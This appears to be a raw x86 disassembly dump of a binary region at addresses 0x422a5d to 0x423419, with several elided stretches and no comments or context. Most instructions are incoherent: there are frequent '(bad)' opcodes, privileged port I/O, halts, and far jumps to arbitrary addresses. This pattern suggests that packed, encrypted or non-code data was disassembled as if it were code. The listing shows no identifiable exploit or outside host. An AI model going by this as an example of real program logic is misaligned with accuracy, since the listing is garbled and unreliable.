  422a5d:	mov    dl,al
  422a5f:	sub    eax,0x9f05eaf7
  422a64:	push   ebx
  422a65:	mov    ch,0xa2
  422a67:	test   BYTE PTR [ecx-0x75],0x2e
  422a6b:	lods   eax,DWORD PTR ds:[esi]
  422a6c:	xchg   ah,dh
  422a6e:	mov    ds:0xd61ec49e,eax
  422a73:	mov    cl,0x87
  422a75:	jb     0x422ab0
  422a77:	or     BYTE PTR [esi+eiz*1],bh
  422a7a:	mov    bh,BYTE PTR [eax-0x74]
  422a7d:	xchg   ebp,ecx
  422a7f:	lock pop edx
  422a81:	mov    dl,0xef
  422a83:	popf   
  422a84:	mov    bl,0xa3
  422a86:	daa    
  422a87:	inc    ebp
  422a88:	test   DWORD PTR [eax],0x9ca54d1b
  422a8e:	jnp    0x422a6e
  422a90:	add    eax,DWORD PTR [ecx+ebp*8-0x67]
  422a94:	cmp    ch,bh
  422a96:	sub    eax,0x52dfab29
  422a9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a9c:	test   DWORD PTR [ebp+0x2f],ebp
  422a9f:	jg     0x422aac
  422aa1:	(bad)  
  422aa2:	mov    dl,0x4b
  422aa4:	rol    DWORD PTR ds:0xf3a2b1b3,cl
  422aaa:	mov    edi,0xc841ca2c
  422aaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ab0:	push   eax
  422ab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ab2:	push   edx
  422ab3:	mov    ds:0xa8bc20a9,eax
  422ab8:	loop   0x422a70
  422aba:	jle    0x422a68
  422abc:	sbb    eax,0x4b0cac69
  422ac1:	jp     0x422ac1
  422ac3:	sahf   
  422ac4:	mov    ebx,eax
  422ac6:	arpl   WORD PTR [edx+0x7],di
  422ac9:	daa    
  422aca:	adc    DWORD PTR [ebp-0x29],esi
  422acd:	outs   dx,BYTE PTR ds:[esi]
  422ace:	outs   dx,BYTE PTR ds:[esi]
  422acf:	(bad)  
  422ad0:	xchg   ebp,eax
  422ad1:	div    ah
  422ad3:	(bad)  
  422ad4:	cmp    BYTE PTR [esi+ebx*2],cl
  422ad7:	retf   0x7275
  422ada:	pop    esi
  422adb:	adc    al,0x8d
  422add:	stos   DWORD PTR es:[edi],eax
  422ade:	cli    
  422adf:	fcomip st,st(1)
  422ae1:	sbb    DWORD PTR [ebp+edx*2-0x6b],ecx
  422ae5:	cli    
  422ae6:	xchg   ebx,eax
  422ae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ae8:	test   dl,0xa7
  422aeb:	mov    eax,ds:0xb8ff623a
  422af0:	rol    BYTE PTR [esi-0x291326eb],cl
  422af6:	fwait
  422af7:	mov    al,ds:0x39c146ff
  422afc:	mov    dh,0xb8
  422afe:	mov    eax,DWORD PTR [edi]
  422b00:	aad    0xfd
  422b02:	push   ecx
  422b03:	sub    DWORD PTR [ecx+0x55c55e1f],0xf4c47742
  422b0d:	cmp    eax,0x2d122b86
  422b12:	mov    edx,DWORD PTR [ebx]
  422b14:	jae    0x422adb
  422b16:	popa   
  422b17:	pop    ecx
  422b18:	jns    0x422af5
  422b1a:	cli    
  422b1b:	xchg   BYTE PTR [ebp-0x4b467a4f],bl
  422b21:	(bad)  
  422b22:	jle    0x422b64
  422b24:	pop    esi
  422b25:	dec    esp
  422b26:	add    al,0xeb
  422b28:	mov    al,0xed
  422b2a:	repnz cld 
  422b2c:	push   ebx
  422b2d:	push   esi
  422b2e:	push   ecx
  422b2f:	xchg   edi,eax
  422b30:	or     DWORD PTR [eax+0xd7d7af],esp
	...
  422b96:	inc    esp
  422b97:	aaa    
  422b98:	dec    edx
  422b99:	fwait
  422b9a:	jnp    0x422b9b
  422b9c:	aad    0xff
  422b9e:	push   cs
  422b9f:	adc    ebx,DWORD PTR [ecx-0x4ddc19e4]
  422ba5:	mov    edx,0x1713f
  422baa:	pop    es
  422bab:	add    DWORD PTR [eax],eax
  422bad:	add    BYTE PTR [ebx+eiz*4+0x6809c423],cl
  422bb4:	mov    ds:0xf71f4112,al
  422bb9:	in     eax,dx
  422bba:	add    al,0x8f
  422bbc:	xor    eax,0xf28d3301
  422bc1:	out    dx,eax
  422bc2:	xor    DWORD PTR [ebx-0x16a90b2e],edi
  422bc8:	pop    es
  422bc9:	cld    
  422bca:	enter  0x61d5,0x33
  422bce:	jae    0x422bd8
  422bd0:	xchg   edi,eax
  422bd2:	lea    esi,[eax-0x73]
  422bd5:	sub    DWORD PTR [edi+0x70],esi
  422bd8:	add    al,0xc3
  422bda:	lods   al,BYTE PTR ds:[esi]
  422bdb:	bswap  esi
  422bdd:	mov    ecx,DWORD PTR [ebx-0x3d]
  422be0:	pop    edi
  422be1:	scas   al,BYTE PTR es:[edi]
  422be2:	fadd   DWORD PTR [ecx+edx*4]
  422be5:	aas    
  422be6:	sbb    eax,0x7b856e19
  422beb:	and    esi,eax
  422bed:	sti    
  422bee:	hlt    
  422bef:	or     eax,0xb6f8851c
  422bf4:	and    al,0x3f
  422bf6:	inc    edi
  422bf7:	mov    ecx,DWORD PTR [edi+0x758ea96d]
  422bfd:	call   0x1620b39f
  422c02:	lods   al,BYTE PTR ds:[esi]
  422c03:	pushf  
  422c04:	test   dh,cl
  422c06:	adc    BYTE PTR [eax+0x1f],cl
  422c09:	inc    edx
  422c0a:	add    DWORD PTR [edi],ebp
  422c0c:	mov    cl,0xc8
  422c0e:	inc    eax
  422c0f:	mov    cl,al
  422c11:	or     ecx,DWORD PTR [esi]
  422c13:	jle    0x422bb9
  422c15:	mov    esi,0xdeaf1427
  422c1a:	add    eax,0xc1c0a169
  422c1f:	and    bh,BYTE PTR [ebx+0x41118d5e]
  422c25:	jae    0x422c1c
  422c27:	jl     0x422c2d
  422c29:	xor    al,0xf7
  422c2b:	call   0x85eb1ab0
  422c30:	fsub   st(2),st
  422c32:	xchg   esi,eax
  422c33:	ins    DWORD PTR es:[edi],dx
  422c34:	into   
  422c35:	add    dl,BYTE PTR [eax+0x1a]
  422c38:	test   BYTE PTR [eax+0x48],bl
  422c3b:	mov    dh,0xb5
  422c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c3e:	mov    dl,BYTE PTR [ecx+ebp*1]
  422c41:	mov    edx,0xb6d7ec7
  422c46:	pop    edx
  422c47:	les    ebp,FWORD PTR ds:0xc5514f62
  422c4d:	retf   
  422c4e:	ins    DWORD PTR es:[edi],dx
  422c4f:	jb     0x422c0d
  422c51:	pop    es
  422c52:	xor    ebp,edi
  422c54:	inc    esp
  422c55:	stos   DWORD PTR es:[edi],eax
  422c56:	mov    WORD PTR [esi+0x23],gs
  422c59:	(bad)  
  422c5a:	xchg   ebx,eax
  422c5b:	test   eax,0x53b805b2
  422c60:	repz aad 0x8d
  422c63:	sar    ch,0x41
  422c66:	mov    WORD PTR [esi],cs
  422c68:	ret    
  422c69:	retf   0x91c5
  422c6c:	and    eax,0x2c72ca41
  422c71:	xchg   ebx,eax
  422c72:	sahf   
  422c73:	jmp    0x8f40041
  422c78:	loope  0x422c05
  422c7a:	arpl   WORD PTR [ebx],bx
  422c7c:	pop    edx
  422c7d:	ins    DWORD PTR es:[edi],dx
  422c7e:	cmp    BYTE PTR [eax+ebx*8-0x55],cl
  422c82:	(bad)  
  422c83:	pop    ebx
  422c84:	icebp  
  422c85:	popf   
  422c86:	sbb    DWORD PTR [eax-0x5e8e9181],eax
  422c8c:	or     ch,bh
  422c8e:	pop    ecx
  422c8f:	leave  
  422c90:	jns    0x422c74
  422c92:	push   edx
  422c93:	clc    
  422c94:	(bad)
  422c98:	pop    ss
  422c99:	mov    ch,BYTE PTR [esp+ebx*1]
  422c9c:	div    al
  422c9e:	add    eax,0xc73fac8c
  422ca3:	out    0x76,al
  422ca5:	inc    ebx
  422ca6:	ins    BYTE PTR es:[edi],dx
  422ca7:	cmp    ah,BYTE PTR [edx-0x38e192cd]
  422cad:	pop    edx
  422cae:	iret   
  422caf:	jle    0x422d09
  422cb1:	in     eax,0xdb
  422cb3:	into   
  422cb4:	jp     0x422cb6
	...
  422d16:	mov    edi,0x626d60bd
  422d1b:	std    
  422d1c:	mov    edi,0x26c593ff
  422d21:	fild   QWORD PTR [ecx+edi*2]
  422d24:	add    al,0x56
  422d26:	inc    esi
  422d27:	jb     0x422d2a
  422d29:	add    BYTE PTR [edi],al
  422d2b:	add    DWORD PTR [eax],eax
  422d2d:	add    BYTE PTR [edx],cl
  422d2f:	sub    esp,DWORD PTR [ecx-0x80]
  422d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d33:	psubb  mm7,QWORD PTR ds:0x918e9c5e
  422d3a:	xchg   edi,eax
  422d3b:	in     eax,dx
  422d3c:	call   0xb123242e
  422d41:	lods   al,BYTE PTR ds:[esi]
  422d42:	cmp    al,0x1e
  422d44:	cli    
  422d45:	sbb    DWORD PTR [edx+0x76e3259b],edi
  422d4b:	push   esi
  422d4c:	pop    ds
  422d4d:	in     eax,0x3
  422d4f:	xchg   ecx,eax
  422d50:	(bad)  
  422d51:	cmp    eax,0xf66aa6a0
  422d56:	fstp   TBYTE PTR ds:0x13d48bb1
  422d5c:	iret   
  422d5d:	or     dh,BYTE PTR [eax+ecx*1+0x2fa4c46c]
  422d64:	out    0xdc,al
  422d66:	jle    0x422d03
  422d68:	dec    ecx
  422d69:	xchg   edi,eax
  422d6a:	aaa    
  422d6b:	leave  
  422d6c:	ds xor cl,al
  422d6f:	xchg   ecx,eax
  422d70:	das    
  422d71:	inc    edi
  422d72:	nop
  422d73:	and    DWORD PTR [ebx-0xb95bad9],0xd3657463
  422d7d:	jae    0x422db7
  422d7f:	push   cs
  422d80:	pop    esp
  422d81:	push   cs
  422d82:	arpl   WORD PTR [ebx+0x21],bp
  422d85:	mov    esi,DWORD PTR [esi]
  422d87:	int    0x98
  422d89:	scas   al,BYTE PTR es:[edi]
  422d8a:	sub    dl,BYTE PTR [ebp+0x51]
  422d8d:	sti    
  422d8e:	add    ecx,edx
  422d90:	(bad)  
  422d91:	loop   0x422df7
  422d93:	dec    esi
  422d94:	add    DWORD PTR [ebx+0x2f6c36fc],ebp
  422d9a:	fbstp  TBYTE PTR [ebp+0x38860d68]
  422da0:	retf   0x9219
  422da3:	in     al,0xf1
  422da5:	fwait
  422da6:	dec    edx
  422da7:	sub    al,0x14
  422da9:	sub    eax,0xae7fdef2
  422dae:	cmp    edx,edi
  422db0:	jno    0x422e17
  422db2:	push   esi
  422db3:	repnz mov dh,BYTE PTR [edi-0xd7e78e0]
  422dba:	and    BYTE PTR [ebx-0x1d26839c],cl
  422dc0:	ss sub al,0x9f
  422dc3:	mov    bh,0xa0
  422dc5:	es data16 cli 
  422dc8:	cmp    DWORD PTR ds:0xf8c0c895,ecx
  422dce:	mov    al,0xad
  422dd0:	cmp    al,0xa
  422dd2:	lds    ecx,FWORD PTR [ebp+0x3852d057]
  422dd8:	inc    ebp
  422dd9:	hlt    
  422dda:	push   ss
  422ddb:	lods   eax,DWORD PTR ds:[esi]
  422ddc:	jo     0x422d7a
  422dde:	fld    DWORD PTR [ecx+0x377cc9b2]
  422de4:	not    BYTE PTR [ebx]
  422de6:	jb     0x422dc5
  422de8:	xchg   edx,eax
  422de9:	sbb    al,0x51
  422deb:	xor    DWORD PTR [esi+0x4b683ed9],0x6a
  422df2:	idiv   DWORD PTR [edi+esi*4]
  422df5:	in     al,0xee
  422df7:	dec    esi
  422df8:	cmp    DWORD PTR [eax-0x79],esi
  422dfb:	dec    ecx
  422dfc:	loope  0x422e1c
  422dfe:	mov    dl,0x6e
  422e00:	sti    
  422e01:	mov    eax,0xc4cf5a1f
  422e06:	xchg   ebp,eax
  422e07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e08:	xor    eax,0x83268c0a
  422e0d:	clc    
  422e0e:	out    dx,al
  422e0f:	leave  
  422e10:	pop    ebp
  422e11:	ins    BYTE PTR es:[edi],dx
  422e12:	lods   eax,DWORD PTR ds:[esi]
  422e13:	stc    
  422e14:	xchg   BYTE PTR [ecx-0x39],bh
  422e17:	in     al,dx
  422e18:	fidivr WORD PTR [ebp-0x57]
  422e1b:	or     edx,edi
  422e1d:	push   0x77
  422e1f:	or     BYTE PTR [ebp+ecx*1-0x7287f91],ch
  422e26:	cld    
  422e27:	sbb    al,0x48
  422e29:	pushf  
  422e2a:	sub    al,0x7f
  422e2c:	xchg   DWORD PTR [ebp-0x2afcd9ab],esp
  422e32:	or     al,0xb6
  422e34:	outs   dx,BYTE PTR ds:[esi]
	...
  422e95:	add    BYTE PTR [ebx-0x21e677ab],al
  422e9b:	fst    QWORD PTR [ebx+0x2a9187df]
  422ea1:	mov    ebx,0x623c29f2
  422ea6:	dec    ebp
  422ea7:	jae    0x422eaa
  422ea9:	add    BYTE PTR [edi],al
  422eab:	add    DWORD PTR [eax],eax
  422ead:	add    al,ah
  422eaf:	sub    DWORD PTR [edx+0x79],eax
  422eb2:	add    BYTE PTR [ecx-0x37],bl
  422eb5:	pop    edi
  422eb6:	push   0xffffffe2
  422eb8:	mov    ah,ch
  422eba:	add    DWORD PTR [ecx],ecx
  422ebc:	retf   0x6ec0
  422ebf:	add    bh,0x3a
  422ec2:	aas    
  422ec3:	aaa    
  422ec4:	out    dx,al
  422ec5:	rcl    DWORD PTR [ebp+0x5],cl
  422ec8:	shl    BYTE PTR [edx+0x1f],cl
  422ecb:	mov    edx,0xc28987eb
  422ed0:	cli    
  422ed1:	pop    ds
  422ed2:	push   edx
  422ed3:	outs   dx,DWORD PTR ds:[esi]
  422ed4:	pusha  
  422ed5:	push   ebp
  422ed6:	jge    0x422f07
  422ed8:	add    ebp,DWORD PTR [edi-0x4596bf5d]
  422ede:	pop    es
  422edf:	fwait
  422ee0:	jns    0x422f2b
  422ee2:	inc    esi
  422ee3:	mov    ch,BYTE PTR [ebx+0x40]
  422ee6:	mov    bl,0x63
  422ee8:	and    ebp,ebx
  422eea:	mov    edx,0x3e919515
  422eef:	(bad)  
  422ef0:	cmp    BYTE PTR [ebx+0x480ca88c],al
  422ef6:	sbb    esi,DWORD PTR [ecx]
  422ef8:	and    al,ch
  422efa:	lods   al,BYTE PTR ds:[esi]
  422efb:	neg    DWORD PTR [esi-0x56]
  422efe:	xchg   ebx,eax
  422eff:	adc    al,0x84
  422f01:	sub    al,0x15
  422f03:	test   eax,0x8874f1fc
  422f08:	shr    DWORD PTR [ebp+0x4f],cl
  422f0b:	or     edx,DWORD PTR [ecx+0x17]
  422f0e:	shr    bh,cl
  422f10:	dec    ebx
  422f11:	push   ss
  422f12:	jb     0x422f8d
  422f14:	push   esi
  422f15:	adc    al,0xf3
  422f17:	mov    ds:0x4d38d681,al
  422f1c:	dec    ebp
  422f1d:	loope  0x422f9e
  422f1f:	add    BYTE PTR [edx+0x655ee9f8],bh
  422f25:	xchg   esi,eax
  422f26:	outs   dx,BYTE PTR ds:[esi]
  422f27:	and    BYTE PTR [ecx-0x77f3454b],al
  422f2d:	dec    ebp
  422f2e:	or     eax,0x5b82e06e
  422f33:	cmpxchg BYTE PTR [ebx],ah
  422f36:	(bad)  
  422f37:	jnp    0x422f2f
  422f39:	pop    esp
  422f3a:	es (bad) 
  422f3d:	jecxz  0x422ece
  422f3f:	leave  
  422f40:	mov    WORD PTR [edx+eiz*2],ds
  422f43:	dec    edi
  422f44:	(bad)  
  422f45:	jo     0x422eeb
  422f47:	es jge 0x422f93
  422f4a:	add    ebp,eax
  422f4c:	push   ds
  422f4d:	mov    bl,0x37
  422f4f:	lahf   
  422f50:	into   
  422f51:	popf   
  422f52:	aad    0x96
  422f54:	cmovge eax,DWORD PTR [ecx]
  422f57:	inc    ebx
  422f58:	push   ecx
  422f59:	xchg   edi,eax
  422f5a:	inc    esp
  422f5b:	(bad)  
  422f5c:	fldcw  WORD PTR [esi]
  422f5e:	jl     0x422f45
  422f60:	cmp    eax,0xb354fcec
  422f65:	jecxz  0x422f6c
  422f67:	mov    eax,ds:0x546d05bf
  422f6c:	jno    0x422f52
  422f6e:	enter  0x1789,0x97
  422f72:	adc    BYTE PTR [ebp+0x5c65f3f],ch
  422f78:	jne    0x422f4a
  422f7a:	pop    ds
  422f7b:	pop    edx
  422f7c:	les    edi,FWORD PTR [ebx-0x4c]
  422f7f:	mov    ah,0xa5
  422f81:	sub    eax,ebp
  422f83:	inc    edx
  422f84:	out    0xcf,eax
  422f86:	in     al,0x86
  422f88:	dec    edx
  422f89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f8a:	int    0xa2
  422f8c:	gs adc al,0xc7
  422f8f:	jbe    0x422f38
  422f91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f92:	xchg   ebp,eax
  422f93:	pop    ebx
  422f94:	repnz arpl WORD PTR [eax],dx
  422f97:	ja     0x423018
  422f99:	xor    DWORD PTR [edx-0x68],esi
  422f9c:	fcomp  QWORD PTR [esp+edi*1-0x39]
  422fa0:	mov    ch,0xf9
  422fa2:	les    esp,FWORD PTR [edx+0x4d]
  422fa5:	dec    edi
  422fa6:	sub    BYTE PTR [eax-0x32],ah
  422fa9:	imul   ecx,DWORD PTR [eax-0x2dec22e4],0xffffff87
  422fb0:	jno    0x422fc8
  422fb2:	imul   ebx,DWORD PTR [ebp-0xa],0x0
	...
  423016:	inc    esi
  423017:	in     al,0x62
  423019:	mov    dl,ah
  42301b:	mov    gs,esi
  42301d:	out    dx,al
  42301e:	lahf   
  42301f:	aaa    
  423020:	inc    ebp
  423021:	or     DWORD PTR [ebp+0x54f94213],ecx
  423027:	je     0x42302a
  423029:	add    BYTE PTR [edi],al
  42302b:	add    DWORD PTR [eax],eax
  42302d:	add    BYTE PTR [esi],dl
  42302f:	push   es
  423030:	mov    dl,0xaa
  423032:	cmp    BYTE PTR [esi+ecx*2-0x708643a5],ah
  423039:	pop    ebp
  42303a:	mov    edi,0x93b14aff
  42303f:	ja     0x42308e
  423041:	daa    
  423042:	push   eax
  423043:	mov    dl,0x1b
  423045:	popf   
  423046:	sbb    ah,ch
  423048:	int3   
  423049:	mov    ecx,DWORD PTR [ebp+edx*8-0x5018b0c3]
  423050:	cwde   
  423051:	mov    cl,0x62
  423053:	pop    edx
  423054:	xchg   BYTE PTR [ecx-0x3f6d78e3],dh
  42305a:	push   ecx
  42305b:	das    
  42305c:	push   DWORD PTR [ebp-0x2f98121a]
  423062:	(bad)  
  423063:	jl     0x4230d7
  423065:	adc    DWORD PTR [ebx],ecx
  423067:	test   DWORD PTR [esi+0x510974c6],0x362cafa3
  423071:	pop    ds
  423072:	pop    esi
  423073:	call   edx
  423075:	data16 sub al,0x33
  423078:	mov    eax,0x97867643
  42307d:	(bad)  
  42307e:	hlt    
  42307f:	cdq    
  423080:	cdq    
  423081:	sbb    BYTE PTR [edx+0x542f7d44],cl
  423087:	and    BYTE PTR [eax],bl
  423089:	push   edx
  42308a:	inc    esi
  42308b:	xchg   edx,eax
  42308c:	jae    0x423090
  42308e:	add    BYTE PTR [ebx+0x5d3f0df3],cl
  423094:	stos   DWORD PTR es:[edi],eax
  423095:	push   ebp
  423096:	jo     0x423021
  423098:	push   ds
  423099:	and    edx,ebx
  42309b:	xchg   ecx,eax
  42309c:	pop    esi
  42309e:	pop    esp
  42309f:	jle    0x423049
  4230a1:	mov    eax,0xb6b75f1f
  4230a6:	repnz ins DWORD PTR es:[edi],dx
  4230a8:	and    ah,BYTE PTR [eax+0x7f]
  4230ab:	ret    
  4230ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230ad:	outs   dx,DWORD PTR ds:[esi]
  4230ae:	lods   eax,DWORD PTR ds:[esi]
  4230af:	mov    ebp,DWORD PTR [eax-0x6c6dae1f]
  4230b5:	and    al,0x9b
  4230b7:	loope  0x4230e5
  4230b9:	imul   esp,edi,0x17ef1243
  4230bf:	mov    DWORD PTR [edx-0x38],esi
  4230c2:	add    DWORD PTR [ecx],ebx
  4230c4:	or     eax,0x8b4394a3
  4230c9:	adc    eax,0x13b95d6c
  4230ce:	ja     0x42307c
  4230d0:	sti    
  4230d1:	cli    
  4230d2:	sub    edi,DWORD PTR [ebx+ebx*4+0x4e360efb]
  4230d9:	mov    DWORD PTR [esi+0xa5e997],ebp
  4230df:	sub    BYTE PTR [edx+0x51e54d1e],ch
  4230e5:	fmul   QWORD PTR [eax]
  4230e7:	mov    al,ds:0xf6f249fd
  4230ec:	xor    dl,BYTE PTR [ecx+0x5272f10e]
  4230f2:	fnstcw WORD PTR cs:[ecx+0x6e3308cb]
  4230f9:	sub    esp,DWORD PTR [edx+0x54]
  4230fc:	sub    DWORD PTR [edx-0x33b7fc43],edi
  423102:	xchg   bl,bl
  423104:	jbe    0x42313b
  423106:	push   eax
  423107:	sbb    BYTE PTR [ebp-0x24],ch
  42310a:	(bad)  
  42310c:	push   ebp
  42310d:	and    al,0x90
  42310f:	adc    DWORD PTR [ebp-0x6d],eax
  423112:	out    0x63,eax
  423114:	pop    DWORD PTR [ebx]
  423116:	pop    ebx
  423117:	xor    DWORD PTR [eax+0x35],ecx
  42311a:	daa    
  42311b:	xor    bl,dl
  42311d:	ret    
  42311e:	and    al,0x45
  423120:	arpl   dx,bx
  423122:	mov    edi,0xbf7752a4
  423127:	lahf   
  423128:	mov    eax,ds:0x4879c74b
  42312d:	jns    0x42310b
  42312f:	data16 sbb BYTE PTR [esi-0x72],bl
  423133:	jb     0x423130
	...
  423195:	add    BYTE PTR [ecx-0xf],bh
  423198:	div    DWORD PTR [ecx-0x6804801]
  42319e:	dec    edi
  42319f:	jno    0x423168
  4231a1:	sbb    BYTE PTR [ebx+0x40],0xea
  4231a5:	stos   BYTE PTR es:[edi],al
  4231a6:	pop    ebx
  4231a7:	jne    0x4231aa
  4231a9:	add    BYTE PTR [edi],al
  4231ab:	add    DWORD PTR [eax],eax
  4231ad:	add    BYTE PTR [ebx+0x3435038a],cl
  4231b3:	mov    WORD PTR [ecx+0x1ecf65c],ds
  4231b9:	lds    esi,FWORD PTR [edi+0x2dab4cc]
  4231bf:	push   edi
  4231c0:	aam    0x62
  4231c2:	jle    0x4231ee
  4231c4:	es cli 
  4231c6:	mov    ebx,0x54d2cc11
  4231cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231cc:	sub    ebp,DWORD PTR [ebx+0x55]
  4231cf:	mov    bl,0x70
  4231d1:	cmp    esi,DWORD PTR [edi+ebx*2-0x2bddd7e]
  4231d8:	cwde   
  4231d9:	nop
  4231da:	jbe    0x423223
  4231dc:	loope  0x4231a0
  4231de:	retf   0x5a92
  4231e1:	das    
  4231e2:	fsub   DWORD PTR [edx+0x22412b8a]
  4231e8:	push   ebx
  4231e9:	inc    ebx
  4231ea:	fdivr  DWORD PTR [eax+0x5793c1e2]
  4231f0:	jne    0x42320d
  4231f2:	jmp    0x42317b
  4231f4:	cmp    eax,0xebeeb6ba
  4231f9:	jbe    0x423186
  4231fb:	mov    esi,0x1c796903
  423200:	cwde   
  423201:	push   es
  423202:	popf   
  423203:	dec    ecx
  423204:	inc    ebp
  423205:	fidivr DWORD PTR [edx]
  423207:	inc    ebx
  423208:	aaa    
  423209:	push   0x76
  42320b:	stos   DWORD PTR es:[edi],eax
  42320c:	xchg   ebp,eax
  42320d:	mov    cl,0xc9
  42320f:	outs   dx,DWORD PTR ds:[esi]
  423210:	out    dx,al
  423211:	xor    BYTE PTR [edi+edx*2+0x18],al
  423215:	dec    ebx
  423216:	jbe    0x4231f5
  423218:	jbe    0x4231b9
  42321a:	fwait
  42321b:	jo     0x423227
  42321d:	dec    ebx
  42321e:	mov    dh,0xa7
  423220:	xchg   esp,eax
  423221:	sahf   
  423222:	in     al,dx
  423223:	jns    0x42323b
  423225:	sub    edi,DWORD PTR [ecx-0xa]
  423228:	xor    BYTE PTR [ebp+0x41],dl
  42322b:	fs stos BYTE PTR es:[edi],al
  42322d:	push   ss
  42322e:	call   0xb18b:0x17d3f949
  423235:	cmp    ah,BYTE PTR [edi]
  423237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423238:	xor    eax,eax
  42323a:	mov    ebx,0x9a5d52c2
  42323f:	ret    0xaf00
  423242:	sbb    eax,0x5db44b45
  423247:	push   0x20f28da0
  42324c:	dec    esi
  42324d:	inc    ebx
  42324e:	jmp    0x94f5:0xeda8d550
  423255:	dec    ebp
  423256:	int    0x10
  423258:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423259:	dec    ebp
  42325a:	repz retf 
  42325c:	repz sub al,0xf1
  42325f:	scas   al,BYTE PTR es:[edi]
  423260:	es pushf 
  423262:	adc    DWORD PTR [eax-0x3236508e],eax
  423268:	sti    
  423269:	jno    0x423258
  42326b:	ins    DWORD PTR es:[edi],dx
  42326c:	or     esi,DWORD PTR [eax+0x46]
  42326f:	hlt    
  423270:	xchg   esi,eax
  423271:	pop    ebp
  423272:	cwde   
  423273:	pushf  
  423274:	adc    edi,ebp
  423276:	retf   
  423277:	scas   al,BYTE PTR es:[edi]
  423278:	gs fs inc esp
  42327b:	xchg   BYTE PTR [ecx],ah
  42327d:	dec    ebx
  42327e:	dec    esi
  42327f:	sbb    DWORD PTR [eax+0x6175fc7f],esp
  423285:	daa    
  423286:	jmp    0x42328d
  423288:	add    DWORD PTR [edi+0x2b6e281a],edx
  42328e:	dec    eax
  42328f:	out    dx,al
  423290:	cmp    DWORD PTR [esp+ecx*2+0x2d4eb8a0],esi
  423297:	mov    dh,0xbf
  423299:	jmp    FWORD PTR [ebx+0xca0198f]
  42329f:	(bad)  
  4232a0:	pop    edx
  4232a1:	cs adc edi,esp
  4232a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232a5:	mov    esi,0xd086a55c
  4232aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232ab:	retf   0xec8b
  4232ae:	and    ah,BYTE PTR [ecx+0x54142830]
  4232b4:	hlt    
	...
  423315:	add    al,bh
  423317:	fisub  WORD PTR [edx+0x30]
  42331a:	mov    sp,0xdefa
  42331e:	xchg   edi,eax
  42331f:	inc    esp
  423320:	lock (bad) 
  423322:	push   edx
  423323:	arpl   WORD PTR [esi],cx
  423325:	punpckldq mm6,DWORD PTR [esi+0x1]
  423329:	add    BYTE PTR [edi],al
  42332b:	add    DWORD PTR [eax],eax
  42332d:	add    ch,ah
  42332f:	jns    0x42337d
  423331:	or     DWORD PTR [ecx+0x69],0xf19c770a
  423338:	jnp    0x4232e0
  42333a:	mov    fs,WORD PTR [eax+0x82331f4]
  423340:	cld    
  423341:	pop    edx
  423342:	inc    edx
  423343:	lahf   
  423344:	push   ss
  423345:	(bad)  
  423346:	stos   DWORD PTR es:[edi],eax
  423347:	mov    edx,0xb4216f84
  42334c:	mov    cl,0xa5
  42334e:	in     al,0x1f
  423350:	rcl    dl,0xc5
  423353:	sbb    eax,DWORD PTR [edi]
  423355:	repz aaa 
  423357:	icebp  
  423358:	or     DWORD PTR [ecx-0x7b977ed5],edx
  42335e:	(bad)  
  423360:	in     eax,dx
  423361:	pop    edi
  423362:	in     eax,dx
  423363:	adc    BYTE PTR [eax-0x1cdc90de],dh
  423369:	int3   
  42336a:	outs   dx,DWORD PTR ds:[esi]
  42336b:	sbb    edi,DWORD PTR ds:0x165d0b06
  423371:	imul   edx,ebp,0x73
  423374:	mov    al,ds:0x7932022a
  423379:	bound  eax,QWORD PTR [eax]
  42337b:	lahf   
  42337c:	mov    bh,0x57
  42337e:	or     ebx,ecx
  423380:	jne    0x423368
  423382:	cmp    al,0x89
  423384:	jge    0x4233e4
  423386:	push   ebx
  423387:	sahf   
  423388:	inc    ebp
  423389:	push   ebp
  42338a:	iret   
  42338b:	ja     0x4233d1
  42338d:	jmp    0x42337f
  42338f:	jecxz  0x423409
  423391:	pop    ss
  423392:	dec    esp
  423393:	je     0x423326
  423395:	(bad)  
  423396:	pop    esi
  423397:	mov    ebp,0x7dc00f89
  42339c:	and    al,0xba
  42339e:	xchg   edx,eax
  42339f:	sahf   
  4233a0:	and    BYTE PTR [ecx+0x16],dl
  4233a3:	push   0xdae3680e
  4233a8:	xchg   edx,eax
  4233a9:	adc    dl,BYTE PTR [edi]
  4233ab:	sbb    DWORD PTR ds:0x60cce3e6,eax
  4233b1:	lods   eax,DWORD PTR ds:[esi]
  4233b2:	sbb    bl,BYTE PTR [esi-0x56c78cc7]
  4233b8:	mov    edi,0x99a79a32
  4233bd:	call   0xb307:0x3c3460b
  4233c4:	ror    DWORD PTR [ebp-0x11],cl
  4233c7:	test   eax,0x6ff0046c
  4233cc:	mov    eax,0x6cf982a2
  4233d1:	jae    0x423390
  4233d3:	inc    esi
  4233d4:	je     0x423365
  4233d6:	add    BYTE PTR [edi+0x1e9c7969],ah
  4233dc:	push   esi
  4233dd:	xchg   al,al
  4233df:	inc    ebx
  4233e0:	and    DWORD PTR [ebp-0x3e],eax
  4233e3:	ja     0x4233be
  4233e5:	call   0x8bee0f7f
  4233ea:	dec    ebp
  4233eb:	in     al,dx
  4233ec:	sbb    ecx,ebp
  4233ee:	mov    al,0x9e
  4233f0:	clc    
  4233f1:	pop    ds
  4233f2:	call   0xfc5322b
  4233f7:	sub    al,0x4c
  4233f9:	jmp    0xc6687841
  4233fe:	es dec edx
  423400:	stos   DWORD PTR es:[edi],eax
  423401:	cmc    
  423402:	or     al,0x37
  423404:	xor    esi,DWORD PTR [edi-0x39b3de10]
  42340a:	pop    ebx
  42340b:	adc    eax,0xfaa62a26
  423410:	hlt    
  423411:	in     eax,0xfb
  423413:	xchg   esi,eax
  423414:	out    0x52,al
  423416:	sar    DWORD PTR [edi],cl
  423418:	dec    ebp
  423419:	xlat   BYTE PTR ds:[ebx]
